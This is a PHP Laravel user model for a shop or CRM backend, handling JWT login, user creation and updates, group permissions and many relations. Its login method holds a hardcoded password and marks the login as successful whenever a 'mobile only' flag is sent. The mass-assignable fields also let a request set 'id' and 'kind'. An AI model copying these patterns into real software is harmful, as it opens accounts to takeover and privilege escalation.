<?php


namespace Core\Packages\shop;

use Exception;
use Carbon\Carbon;
use App\Models\User\User;
use Core\Packages\gis\City;
use Core\Packages\gis\Areas;
use Core\Packages\gis\Points;
use Core\Packages\gis\Routes;
use Core\Packages\order\Visi;
use Core\Packages\role\Roles;
use App\Models\User\VisitTime;
use Core\Packages\common\File;
use Core\Packages\gis\Country;
use Core\Packages\group\Group;
use Core\Packages\order\Order;
use EloquentFilter\Filterable;
use Core\Packages\gis\Province;
use App\ModelFilters\UserFilter;
use const Siler\Functional\call;
use Core\Packages\coupon\Coupon;
use Core\Packages\product\Brand;
use Core\Packages\role\UserRoles;
use Core\Packages\common\Constant;
use Core\Packages\product\Product;
use Laravel\Passport\HasApiTokens;
use Tymon\JWTAuth\Facades\JWTAuth;
use App\Models\Order\PaymentMethod;
use Core\Packages\visitor\Visitors;
use Core\Packages\customer\Loglogin;
use Illuminate\Support\Facades\Auth;
use Core\Packages\company\PriceClass;
use Illuminate\Support\Facades\Route;

use Core\Packages\customer\Connection;
use Spatie\Permission\Traits\HasRoles;
use Core\Packages\role\RolePermissions;
use Tymon\JWTAuth\Contracts\JWTSubject;
use Core\Packages\role\PermissionsPanel;
use Core\System\Http\Traits\HelperTrait;
use App\Models\User\ReasonForNotVisiting;
use Core\Packages\company\IntroducerCode;
use Core\System\Exceptions\CoreException;
use Core\System\Http\Traits\SecureDelete;
use Core\Packages\customer\CompanyCustomer;
use Illuminate\Database\Eloquent\SoftDeletes;
use Core\Packages\order\PaymentMethodCustomer;

use Core\Packages\visitor_position\VisitorPosition;
use Illuminate\Foundation\Auth\User as Authenticatable;

class Users extends Authenticatable implements JWTSubject
{
    use SecureDelete;
    use HelperTrait;
    use Filterable;
    use SoftDeletes;
    use  HasRoles , HasApiTokens;

    const KIND_COMPANY = 'company';
    const KIND_CUSTOMER = 'customer';
    const KIND_CONSUMER = 'consumer';
    const KIND_VENDOR = 'vendor';
    const KIND_COMPANY_ADMIN = 'company_admin';
    const KIND_ADMIN = 'admin';
    const STATUS_ACTIVE = 'active';
    const STATUS_INACTIVE = 'inactive';
    const STATUS = [
        self::STATUS_ACTIVE => [
            'value' => self::STATUS_ACTIVE,
            'color' => 'success',
        ],
        self::STATUS_INACTIVE => [
            'value' => self::STATUS_INACTIVE,
            'color' => 'danger',
        ]
    ];
    private static $_instance = null;

    public static function _()
    {
        if (self::$_instance == null) {
            self::$_instance = new Users();
        }
        return self::$_instance;
    }

    protected $dates = [
        'effective_id',
        'end_at',
        'deleted_at',
    ];

    protected $appends = [
        'title',
        "full_name",
        "status_translate"
    ];
    protected $fillable = [
        'id',
        'email',
        'password',
        'mobile_number',
        'phone_number',
        'store_name',
        'first_name',
        'last_name',
        'photo_id',
        'kind',
        'crm_api',
        'company_id',
        'description',
        'api_service',
        'referral_id',
        'crm_registered',
        'introduction_source',
        'customer_grade',
        'customer_group',
        'customer_class',
        'national_id',
        'group_id',
        'introducer_code_id'
    ];

    protected $hidden = [
        'password',
        'remember_token',
    ];

    //    protected $casts = [
    //        'score' => 'double',
    //    ];

    public function index()
    {
        try {
            $attributes['offset'] = !empty(request()->get('offset')) ? request()->get('offset') : 0;
            $attributes['size'] = !empty(request()->get('size')) ? request()->get('size') : $this->_pagination;

            $query = $this->where('kind', 'user');
            if (!(auth('api')->user()['kind'] == 'superAdmin' || auth('api')->user()['kind'] == 'admin')) {
                $query->where('company_id', auth('api')->user()->company_id);
            }

            $count = $query->count();
            $result = $query->limit($attributes['size'])->offset($attributes['offset'])->get();
        } catch (\Exception $e) {
            return $this->errorHandler($e->getMessage());
        }
        return $this->modelResponse(['data' => $result, 'count' => $count]);
    }


    public function prepareData($payload)
    {
        $data = [
            'email' => $payload['email'],
            'password' => bcrypt($payload['password']),
            'mobile_number' => $payload['mobile_number'],
            'first_name' => $payload['first_name'],
            'last_name' => $payload['last_name'],
            'kind' => $payload['kind'],
            'status' => self::STATUS_ACTIVE,
            'company_id' => auth('api')->id(),
            'photo_id' => !empty($payload['photo_id']) ? $payload['photo_id'] : null,
            'role_id' => !empty($payload['role_id']) ? $payload['role_id'] : null,
        ];

        if (!empty($data['role_id'])) {
            $findRole = Roles::find($data['role_id']);
            if (!isset($findRole)) {
                throw new CoreException(' شناسه نقش ' . $data['role_id'] . ' یافت نشد');
            }
        }
        return $data;
    }


    public function store($payload)
    {
        $data = $this->prepareData($payload);
        if (!empty($payload['role_id'])) {
            $roleId = $payload['role_id'];
        }
        unset($payload['role_id']);
        try {
            $result = Users::create($data);
            if (!empty($roleId)) {
                UserRoles::create(['user_id' => $result->id, 'role_id' => $roleId]);
            }

            return $this->modelResponse(['data' => $result]);
        } catch (\Exception $e) {
            return $this->errorHandler($e);
        }
    }

    public function updateUser($payload, $id)
    {
        $row = Users::find($id);
        if (empty($row)) {
            throw new CoreException('کاربر مورد نظر یافت نشد');
        }
        $data = $this->prepareData($payload);
        if (!empty($payload['role_id'])) {
            $roleId = $payload['role_id'];
        }
        unset($payload['role_id']);
        try {
            $row->update($data);

            UserRoles::where('user_id', $id)->delete();
            if (!empty($roleId)) {
                UserRoles::create(['user_id' => $id, 'role_id' => $roleId]);
            }

            return $this->modelResponse(['data' => $row]);
        } catch (\Exception $e) {
            return $this->errorHandler($e);
        }
    }

    public function getJWTIdentifier()
    {
        return $this->getKey();
    }

    public function createNewToken($token, $userInfo)
    {
        $message = ($userInfo->first_name)?   $userInfo->first_name.' '.'عزیز خوش آمدید':    "کاربر گرامی خوش آمدید";

        $group = Group::find($userInfo->group_id); //where('id',auth('api')->user()['group_id'])->first();
        $list_urls = ($group) ? json_decode($group->access) : array();
        return $this->modelResponse(['data' => [
            'access_token' => $token,
            'expires_in' => auth('api')->factory()->getTTL() * 60,
            'user' => $userInfo,
            'permissions' => $list_urls,
        ]],$message);
    }

    public function getJWTCustomClaims()
    {
        return [];
    }

    public function login($payload)
    {

        $login = false;
        if (auth('api')->attempt(['mobile_number' => $payload['email'], 'password' => $payload['password']])) {
            $token = auth('api')->attempt(['mobile_number' => $payload['email'], 'password' => $payload['password']]);

            $login = true;
        }
        if (auth('api')->attempt(['email' => $payload['email'], 'password' => $payload['password']])) {
            $token = auth('api')->attempt(['email' => $payload['email'], 'password' => $payload['password']]);
            $login = true;
        }
        if (!empty($payload["log_in_with_mobile_only"])) {
            $user = $this->where('mobile_number' , $payload['email'])->first();

                 $token = auth('api')->attempt(['mobile_number' => $payload['email'], 'password' => '3x+1/2']);



            // $token = auth('api')->login($user);


            $login = true;
        }


        if (!$login) {
            throw new CoreException('اطلاعات کاربری صحیح نمی باشد');
        }

        if (auth('api')->user()->status == 'inactive') {
            throw new CoreException('کاربر غیر فعال می باشد ');
        }
        // if (auth('api')->user()->toArray()['kind'] == 'customer') {
        //     throw new CoreException('اطلاعات کاربری صحیح نمی باشد');
        // }

        $result = $this->createNewToken($token, auth('api')->user());
        if (!empty($result->result)) {
            /*$userRoles = UserRoles::where('user_id', auth('api')->user()['id'])->pluck('role_id');
            $accessPermissions = [];
            if (count($userRoles)) {
                $rolePermissions = RolePermissions::whereIn('role_id', $userRoles->toArray())->pluck('permission_code');
                if (count($rolePermissions)) {
                    $permissions = PermissionsPanel::whereIn('code', $rolePermissions->toArray())->get();
                    if (count($permissions)) {
                        $accessPermissions = $permissions->toArray();
                    }
                }
            }*/

            //$group=Users::with('Group')->where('id', auth('api')->user()['id'])->first()->only('group');
            if (auth('api')->user()->toArray()['kind'] == 'superAdmin') {
                $list_urls = $this->allRoutes();
            } else {
                $group = Group::find(auth('api')->user()['group_id']); //where('id',auth('api')->user()['group_id'])->first();
                $list_urls = ($group) ? json_decode($group->access) : array();
            }
            $result->result['permissions'] = $list_urls;
        }
        return $result;
    }

    public function profile()
    {
        //        $token = auth('api')->refresh();
        //        dd($token);
        $user = auth('api')->user();
        if (is_null($user)) {
            throw new CoreException('توکن معتبر نمی باشد');
        }

        if (auth('api')->user()->toArray()['kind'] == 'superAdmin') {
            $list_urls = $this->allRoutes();
        } else {
            $group = Group::find(auth('api')->user()['group_id']); //where('id',auth('api')->user()['group_id'])->first();
            $list_urls = ($group) ? json_decode($group->access) : array();
        }
        $user->permissions = $list_urls;

        return $this->modelResponse(['data' => $user]);
    }

    //======================================================================
    // Start Relations
    //======================================================================





    public function isCompanyAdmin()
    {
        return $this->kind == self::KIND_COMPANY_ADMIN;
    }

    public function Cities()
    {
        return $this->belongsToMany(City::class, 'user_city', 'user_id');
    }

    public function Photo()
    {
        return $this->belongsTo(File::class);
    }
    public function background()
    {
        return $this->belongsTo(File::class , 'background_id' , 'id');
    }
    public function CompanyRel()
    {
        return $this->belongsTo(User::class, 'company_id');
    }

    public function Brands()
    {
        return $this->belongsToMany(Brand::class, 'user_brand', 'user_id');
    }
    public function Product()
    {
        return $this->hasMany(Product::class, 'company_id', 'id');
    }


    public function modelFilter()
    {
        return $this->provideFilter(UserFilter::class);
    }

    public function Creator()
    {
        return $this->belongsTo(Users::class, 'creator_id');
    }
    public function connection()
    {
        return $this->hasMany(Connection::class, 'user_id');
    }

    public function Countries()
    {
        return $this->belongsToMany(Country::class, 'user_country', 'user_id');
    }

    public function Provinces()
    {
        return $this->belongsToMany(Province::class, 'user_province', 'user_id');
    }

    public function Areas()
    {
        return $this->belongsToMany(Areas::class, 'user_area', 'user_id', "area_id");
    }

    public function Routes()
    {
        return $this->belongsToMany(Routes::class, 'user_route', 'user_id', "route_id");
    }
    public function VisitTime()
    {
        return $this->hasMany(VisitTime::class, 'user_id', 'id');
    }


    public function scopeWhereRouteOne($query, $Route)
    {
        return $query->whereHas('routes', function ($query) use ($Route) {
            $query->where('id', $Route);
        });
    }
    public function scopeWhereNotInRoute($query, $Route)
    {
        return $query->whereHas('routes', function ($query) use ($Route) {
            return $query->where('id', '<>', $Route);
        });
    }

    public function Points()
    {
        return $this->belongsToMany(Points::class, 'user_point', 'user_id', "point_id");
    }

    public function Products()
    {
        return $this->hasMany(Product::class, 'company_id', 'company_id');
    }

    public function Orders()
    {
        return $this->hasMany(Order::class, 'customer_id');
    }


    public function ReasonForNotVisitings()
    {
        return $this->hasMany(ReasonForNotVisiting::class, 'customer_id');
    }
    public function visited()
    {
        $reson = $this->hasMany(ReasonForNotVisiting::class, 'customer_id')->where('registered_source', 'حضوری')->count();
        $order = $this->hasMany(Order::class, 'customer_id')->count();
        if ($reson || $order) {
            return  true;
        } else
            return  false;
    }

    public function UserRole()
    {
        return $this->hasMany(UserRoles::class, 'user_id');
    }
    public function Visitor()
    {
        return $this->hasOne(Visi::class, 'user_id', 'id');
    }

    public function visitorPosition()
    {
        return $this->hasMany(VisitorPosition::class, 'user_id');
    }

    public function PaymentMethodCustomer()
    {
        return $this->hasMany(PaymentMethodCustomer::class, 'customer_id');
    }

    public function Referrals()
    {
        return $this->hasMany(CompanyCustomer::class, 'customer_id');
    }

    public function Addresses()
    {
        return $this->hasMany(Address::class, 'user_id');
    }
    public function logLogin()
    {
        return $this->hasOne(Loglogin::class, 'user_id');
    }

    public function IntroducerCode()
    {
        return $this->belongsTo(IntroducerCode::class, 'introducer_code_id', 'code');
    }

    public function Categories()
    {
        return $this->belongsToMany(Constant::class, 'user_category', 'user_id');
    }

    public function CustomerGrade()
    {
        return $this->belongsTo(Constant::class, 'customer_grade', 'id');
    }

    public function CustomerGroup()
    {
        return $this->belongsTo(Constant::class, 'customer_group', 'id');
    }

    public function CustomerClass()
    {
        return $this->belongsTo(Constant::class, 'customer_class', 'id');
    }

    public function IntroductionSource()
    {
        return $this->belongsTo(Constant::class, 'introduction_source', 'id');
    }

    public function Contacts()
    {
        return $this->hasMany(Contact::class, 'user_id');
    }
    public function Group()
    {
        return $this->hasOne(Group::class, 'id', 'group_id');
    }

    public function PriceClasses()
    {
        return $this->belongsToMany(PriceClass::class, 'price_class_customer', 'customer_id');
    }
    public function coupons()
    {
        return $this->belongsToMany(Coupon::class,'company_coupons', 'coupon_id' , 'company_id');
    }

    //======================================================================
    // End Relations
    //======================================================================

    public function scopeActive($query)
    {
        return $query->where('status', self::STATUS_ACTIVE);
    }

    public function scopeCompany($query)
    {
        return $query->where('kind', self::KIND_COMPANY);
    }

    public function isInactive()
    {
        return $this->status == self::STATUS_INACTIVE;
    }

    public function isActive()
    {
        return $this->status == self::STATUS_ACTIVE;
    }

    public function isAdmin()
    {
        return $this->kind == self::KIND_ADMIN;
    }

    public function scopeMyCompany($query, $user = NULL)
    {

        if (!$user)
            $user = auth('api')->user();

        $cities = $user->Cities->pluck('id')->all();

        return $query->Company()
            ->Active()
            ->whereDate('end_at', '>', Carbon::now())
            ->WhereCities($cities);
    }

    public function scopeWhereCities($query, $cities)
    {
        return $query->whereHas('Cities', function ($query) use ($cities) {
            $query->whereIn('id', $cities);
        });
    }

    public function scopeCompanyId($query, $companyId)
    {
        return $query->where('company_id', $companyId);
    }

    public function getStatusAttribute($value)
    {
        foreach (self::STATUS as $key => $status) {
            if ($value == $status['value']) {
                return $key;
            }
        }
    }

    public function scopeCustomer($query)
    {
        return $query->where('kind', self::KIND_CUSTOMER);
    }

    public function getTitleAttribute()
    {
        $title = '';
        if ($this->kind == 'vendor') {
            $title = $this->attributes['name_fa'];
        } else {
            $title = !empty($this->attributes['first_name']) ?? '' . ' ' . !empty($this->attributes['last_name']) ?? '';
        }

        return $title;
    }

    public function getStatusTranslateAttribute($value)
    {
        foreach (self::STATUS as $key => $status) {
            if ($this->status == $key) {
                return trans('translate.user.status.' . $key);
            }
        }
    }

    public function getEffectiveIdAttribute()
    {
        $userId = NULL;
        if (auth('api')->user()->isAdmin()) {
            $userId = 1;
        } else if (auth('api')->user()->isCompany() || auth('api')->user()->isCompanyAdmin()) {
            $userId = auth('api')->user()->company_id;
        } else {
            $userId = $this->id;
        }

        return $userId;
    }

    public function isCompany()
    {

        return $this->kind == self::KIND_COMPANY;
    }

    public function getFullNameAttribute()
    {
        return $this->first_name . " " . $this->last_name;
    }



    public function allRoutes()
    {
        $web = array();
        $routes = Route::getRoutes();
        //list routes
        foreach ($routes->getRoutes() as $route) {
           if ($route->getActionName()[0] == 'C') {
                $key1 = explode("\\", $route->getActionName());
                if (!isset($key1[5])) continue;
                 array_push($web,"W".$key1[5]);

            }
        }
        return  $web;
    }

}
